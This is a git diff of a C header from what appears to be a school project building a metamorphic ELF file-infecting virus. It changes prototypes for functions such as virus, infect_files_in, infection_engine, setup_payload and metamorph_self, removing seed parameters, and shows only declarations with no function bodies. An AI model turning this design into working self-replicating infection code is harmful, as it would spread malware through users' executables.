@@ -6,7 +6,7 @@
 /*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/12/26 23:54:03 by anselme          ###   ########.fr       */
+/*   Updated: 2019/12/27 01:49:28 by anselme          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -47,10 +47,10 @@ struct				entry
 ** virus entry point and start routines
 */
 
-void		virus(uint64_t seed[2]);
-void		infect_files_in(const char *path, uint64_t seed[2]);
-bool		infect(const char *file, uint64_t seed[2]);
-bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref, uint64_t seed[2]);
+void		virus(void);
+void		infect_files_in(const char *path);
+bool		infect(const char *file);
+bool		infection_engine(struct safe_ptr clone_ref, struct safe_ptr original_ref);
 
 /*
 ** infection engine routines
@@ -61,7 +61,7 @@ bool		setup_payload(struct safe_ptr ref, const struct entry *clone_entry, uint64
 bool		adjust_references(struct safe_ptr ref, size_t shift_amount, size_t end_of_last_section);
 bool		copy_to_clone(struct safe_ptr clone_ref, struct safe_ptr original_ref, \
 			size_t end_last_sect, size_t shift_amount, size_t original_size);
-bool		metamorph_self(uint64_t seed[2], uint64_t son_seed[2], uint64_t client_id);
+bool		metamorph_self(uint64_t son_seed[2], uint64_t client_id);
 
 /*
 ** elf iterators
